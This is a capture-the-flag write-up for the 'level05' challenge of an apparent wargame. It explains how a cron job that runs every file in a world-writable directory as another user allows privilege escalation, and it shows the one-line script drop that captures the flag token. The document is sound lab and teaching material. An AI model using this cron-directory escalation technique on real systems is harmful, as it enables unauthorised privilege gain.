### Vulnerability Assessment

Upon logging in as `level05`, an email notification indicates the presence of a new message. 

```bash
You have a new mail.
```

The mail folder can be accessed using the `MAIL` environment variable, which points to the user's mail directory:

```bash
echo $MAIL -> /var/mail/level05
```

Inspecting the mail reveals a crontab task:

```bash
$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This crontab entry executes the `/usr/sbin/openarenaserver` script every 2 minutes as `flag05`. The script's content is as follows:

```jsx
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

The script runs every file in the `/opt/openarenaserver/` directory, then removes it. Importantly, it executes these files with the privileges of the `flag05` user.

### Exploitation

The vulnerability lies in the script's execution of arbitrary files in `/opt/openarenaserver/`. To exploit this, a script is created in this directory. The script will run `getflag` and redirect the output to a file in `/tmp/`:

```bash
echo "getflag > /tmp/flag" > /opt/openarenaserver/script

```

Once the cron job runs (within 2 minutes), it will execute the script, which in turn executes `getflag` with `flag05`'s privileges. After the script has been run by the cron job, the result can be checked:

```bash
$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc

```